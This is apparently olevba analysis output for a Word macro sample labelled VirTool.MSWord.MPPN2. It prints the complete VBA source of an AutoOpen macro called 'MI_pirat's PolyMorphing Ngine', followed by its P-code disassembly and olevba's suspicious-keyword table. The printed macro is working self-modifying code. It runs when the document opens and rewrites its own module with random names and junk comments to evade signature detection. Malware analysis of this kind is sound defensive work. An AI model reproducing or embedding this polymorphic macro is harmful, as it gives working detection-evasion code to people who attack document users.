olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./VirTool.MSWord.MPPN2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KGB.bas 
in file: ./VirTool.MSWord.MPPN2 - OLE stream: 'Macros/VBA/KGB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'KGB 'F}v!
'MI_pirat's PolyMorphing Ngine '<fo!
On Error Resume Next 'tyH!
If ThisDocument.Name <> NormalTemplate.Name Then '„7X!
KCBM1 = 12 '�x!
ReDim WLBM1(1 To KCBM1) As String ''*’!
WLBM1(1) = "KCBM1": WLBM1(2) = "BFHM1": WLBM1(3) = "RKBM1" '>e+!
WLBM1(4) = "WLBM1": WLBM1(5) = "DOKM1": WLBM1(6) = "KSMM1": WLBM1(7) = "NFLM1" '^)„!
WLBM1(8) = "GFDM1": WLBM1(9) = "EGXM1": WLBM1(10) = "TJGM1": WLBM1(11) = "EYQM1"
WLBM1(12) = "TUMM1" 'UM’!
BFHM1 = ActiveDocument.Content '%`8!
'find and change the module name (100% poly) 'Yy„!
For NFLM1 = 1 To ActiveDocument.VBProject.VBComponents.Count 'I-‹!
TJGM1 = ActiveDocument.VBProject.VBComponents(NFLM1).CodeModule.Lines(2, 1) ']5H!
GFDM1 = Mid(TJGM1, 1, 1) 'E8`!
EGXM1 = Len(TJGM1) '6?2!
If EGXM1 >= 4 Then EYQM1 = Mid(TJGM1, 2, 3) '\e}!
If (GFDM1 = "'") And (EYQM1 = ActiveDocument.VBProject.VBComponents(NFLM1).Name) Then '`ˆN!
Randomize '„ˆf!
EYQM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(NFLM1).CodeModule.ReplaceLine 2, "'" + EYQM1
ActiveDocument.VBProject.VBComponents(NFLM1).Name = EYQM1 'pm7!
TUMM1 = NFLM1 'b/O!
End If '‚E>!
Next NFLM1 '+}^!
'copy this code to the doc '�[c!
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
ActiveDocument.Content = "" '—ŽI!
RKBM1 = ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.CountOfLines '6:l!
'copy this source into the doc (so I can modify it) 'C>Y!
For NFLM1 = 1 To RKBM1 'wo[!
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.Lines(NFLM1, 1)
Next NFLM1 '$VW!
'now find the vars and poymorph 'em !
For NFLM1 = 1 To KCBM1 'K„+!
Randomize 'sXJ!
KSMM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set DOKM1 = ActiveDocument.Content '@D`!
DOKM1.Find.Execute FindText:=WLBM1(NFLM1), ReplaceWith:=KSMM1, Replace:=wdReplaceAll
Next NFLM1 'z]W!
'copy everythig back to its origin '-L“!
RKBM1 = ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.CountOfLines '>q3!
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.DeleteLines 1, RKBM1 'I02!
KSMM1 = ActiveDocument.Content 'f~‚!
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.AddFromString KSMM1 'A�!
ActiveDocument.Content = "" '‰0b!
ActiveDocument.Content = BFHM1 'm^ˆ!
mm: 'ˆRz!
If ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.DeleteLines 1, 1 'w|\!
GoTo mm 'kmd!
End If 'F: !
KCBM1 = ActiveDocument.VBProject.VBComponents.Item(TUMM1).CodeModule.CountOfLines
For NFLM1 = 2 To KCBM1 '*6`!
TJGM1 = ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.Lines(NFLM1, 1) 'q3s!
EYQM1 = Mid(TJGM1, Len(TJGM1)) '&E“!
If (EYQM1 <> "!") And (Len(TJGM1) < 80) Then 'hi+!
GFDM1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
KSMM1 = TJGM1 + " '" + GFDM1 + "!" '?MŠ!
ActiveDocument.VBProject.VBComponents.Item(TUMM1).CodeModule.ReplaceLine NFLM1, KSMM1
End If 'r\„!
Next NFLM1 ':†}!
ActiveDocument.VBProject.VBComponents(TUMM1).CodeModule.DeleteLines KCBM1, 1 '”2B!
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If '#:!
End Sub 'r?)!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./VirTool.MSWord.MPPN2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/KGB - 5698 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0009 "KGB 'F}v!"
' Line #2:
' 	QuoteRem 0x0000 0x0023 "MI_pirat's PolyMorphing Ngine '<fo!"
' Line #3:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0004 "tyH!"
' Line #4:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x0031 0x0004 "„7X!"
' Line #5:
' 	LitDI2 0x000C 
' 	St WLBM1 
' 	QuoteRem 0x000B 0x0004 "�x!"
' Line #6:
' 	LitDI2 0x0001 
' 	Ld WLBM1 
' 	RedimAs BFHM1 0x0001 (As String)
' 	QuoteRem 0x0022 0x0004 "'*’!"
' Line #7:
' 	LitStr 0x0005 "KCBM1"
' 	LitDI2 0x0001 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "BFHM1"
' 	LitDI2 0x0002 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "RKBM1"
' 	LitDI2 0x0003 
' 	ArgsSt BFHM1 0x0001 
' 	QuoteRem 0x003B 0x0004 ">e+!"
' Line #8:
' 	LitStr 0x0005 "WLBM1"
' 	LitDI2 0x0004 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "DOKM1"
' 	LitDI2 0x0005 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "KSMM1"
' 	LitDI2 0x0006 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "NFLM1"
' 	LitDI2 0x0007 
' 	ArgsSt BFHM1 0x0001 
' 	QuoteRem 0x004F 0x0004 "^)„!"
' Line #9:
' 	LitStr 0x0005 "GFDM1"
' 	LitDI2 0x0008 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "EGXM1"
' 	LitDI2 0x0009 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "TJGM1"
' 	LitDI2 0x000A 
' 	ArgsSt BFHM1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "EYQM1"
' 	LitDI2 0x000B 
' 	ArgsSt BFHM1 0x0001 
' Line #10:
' 	LitStr 0x0005 "TUMM1"
' 	LitDI2 0x000C 
' 	ArgsSt BFHM1 0x0001 
' 	QuoteRem 0x0014 0x0004 "UM’!"
' Line #11:
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	St Content 
' 	QuoteRem 0x001F 0x0004 "%`8!"
' Line #12:
' 	QuoteRem 0x0000 0x0031 "find and change the module name (100% poly) 'Yy„!"
' Line #13:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x003D 0x0004 "I-‹!"
' Line #14:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld TJGM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St GFDM1 
' 	QuoteRem 0x004C 0x0004 "]5H!"
' Line #15:
' 	Ld GFDM1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St EGXM1 
' 	QuoteRem 0x0019 0x0004 "E8`!"
' Line #16:
' 	Ld GFDM1 
' 	FnLen 
' 	St EYQM1 
' 	QuoteRem 0x0013 0x0004 "6?2!"
' Line #17:
' 	Ld EYQM1 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld GFDM1 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St Chr 
' 	EndIf 
' 	QuoteRem 0x002C 0x0004 "\e}!"
' Line #18:
' 	Ld EGXM1 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld Chr 
' 	Ld TJGM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0056 0x0004 "`ˆN!"
' Line #19:
' 	ArgsCall Read 0x0000 
' 	QuoteRem 0x000A 0x0004 "„ˆf!"
' Line #20:
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	St Chr 
' Line #21:
' 	LitDI2 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld Chr 
' 	Add 
' 	Ld TJGM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall TUMM1 0x0002 
' Line #22:
' 	Ld Chr 
' 	Ld TJGM1 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' 	QuoteRem 0x003A 0x0004 "pm7!"
' Line #23:
' 	Ld TJGM1 
' 	St Windows 
' 	QuoteRem 0x000E 0x0004 "b/O!"
' Line #24:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "‚E>!"
' Line #25:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 "+}^!"
' Line #26:
' 	QuoteRem 0x0000 0x001F "copy this code to the doc '�[c!"
' Line #27:
' 	Ld RKBM1 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd WindowState 0x0001 
' 	MemSt wdWindowStateMinimize 
' Line #28:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' 	QuoteRem 0x001C 0x0004 "—ŽI!"
' Line #29:
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St KSMM1 
' 	QuoteRem 0x004D 0x0004 "6:l!"
' Line #30:
' 	QuoteRem 0x0000 0x0038 "copy this source into the doc (so I can modify it) 'C>Y!"
' Line #31:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld KSMM1 
' 	For 
' 	QuoteRem 0x0017 0x0004 "wo[!"
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	Ld TJGM1 
' 	LitDI2 0x0001 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' Line #33:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 "$VW!"
' Line #34:
' 	QuoteRem 0x0000 0x0024 "now find the vars and poymorph 'em !"
' Line #35:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WLBM1 
' 	For 
' 	QuoteRem 0x0017 0x0004 "K„+!"
' Line #36:
' 	ArgsCall Read 0x0000 
' 	QuoteRem 0x000A 0x0004 "sXJ!"
' Line #37:
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitStr 0x0002 "M1"
' 	Add 
' 	St DOKM1 
' Line #38:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	Set Find 
' 	QuoteRem 0x0023 0x0004 "@D`!"
' Line #39:
' 	Ld TJGM1 
' 	ArgsLd BFHM1 0x0001 
' 	ParamNamed ReplaceWith 
' 	Ld DOKM1 
' 	ParamNamed Replace 
' 	Ld AddFromString 
' 	ParamNamed wdReplaceAll 
' 	Ld Find 
' 	MemLd Execute 
' 	ArgsMemCall FindText 0x0003 
' Line #40:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 "z]W!"
' Line #41:
' 	QuoteRem 0x0000 0x0027 "copy everythig back to its origin '-L“!"
' Line #42:
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St KSMM1 
' 	QuoteRem 0x004D 0x0004 ">q3!"
' Line #43:
' 	LitDI2 0x0001 
' 	Ld KSMM1 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x004D 0x0004 "I02!"
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd NFLM1 
' 	St DOKM1 
' 	QuoteRem 0x001F 0x0004 "f~‚!"
' Line #45:
' 	Ld DOKM1 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall mm 0x0001 
' 	QuoteRem 0x004C 0x0004 "A�!"
' Line #46:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' 	QuoteRem 0x001C 0x0004 "‰0b!"
' Line #47:
' 	Ld Content 
' 	Ld ActiveDocument 
' 	MemSt NFLM1 
' 	QuoteRem 0x001F 0x0004 "m^ˆ!"
' Line #48:
' 	Label wdWindowStateMaximize 
' 	QuoteRem 0x0004 0x0004 "ˆRz!"
' Line #49:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ne 
' 	IfBlock 
' Line #50:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x0049 0x0004 "w|\!"
' Line #51:
' 	GoTo wdWindowStateMaximize 
' 	QuoteRem 0x0008 0x0004 "kmd!"
' Line #52:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "F: !"
' Line #53:
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WLBM1 
' Line #54:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld WLBM1 
' 	For 
' 	QuoteRem 0x0017 0x0004 "*6`!"
' Line #55:
' 	Ld TJGM1 
' 	LitDI2 0x0001 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St GFDM1 
' 	QuoteRem 0x0050 0x0004 "q3s!"
' Line #56:
' 	Ld GFDM1 
' 	Ld GFDM1 
' 	FnLen 
' 	ArgsLd Mid$ 0x0002 
' 	St Chr 
' 	QuoteRem 0x001F 0x0004 "&E“!"
' Line #57:
' 	Ld Chr 
' 	LitStr 0x0001 "!"
' 	Ne 
' 	Paren 
' 	Ld GFDM1 
' 	FnLen 
' 	LitDI2 0x0050 
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x002D 0x0004 "hi+!"
' Line #58:
' 	LitDI2 0x0078 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0078 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld ReplaceLine 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Rnd 0x0001 
' 	Add 
' 	St EGXM1 
' Line #59:
' 	Ld GFDM1 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld EGXM1 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	St DOKM1 
' 	QuoteRem 0x0023 0x0004 "?MŠ!"
' Line #60:
' 	Ld TJGM1 
' 	Ld DOKM1 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall TUMM1 0x0002 
' Line #61:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "r\„!"
' Line #62:
' 	StartForVariable 
' 	Ld TJGM1 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000B 0x0004 ":†}!"
' Line #63:
' 	Ld WLBM1 
' 	LitDI2 0x0001 
' 	Ld Windows 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	QuoteRem 0x004D 0x0004 "”2B!"
' Line #64:
' 	Ld id_032E 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd WindowState 0x0001 
' 	MemSt wdWindowStateMinimize 
' Line #65:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "#:!"
' Line #66:
' 	EndSub 
' 	QuoteRem 0x0008 0x0004 "r?)!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

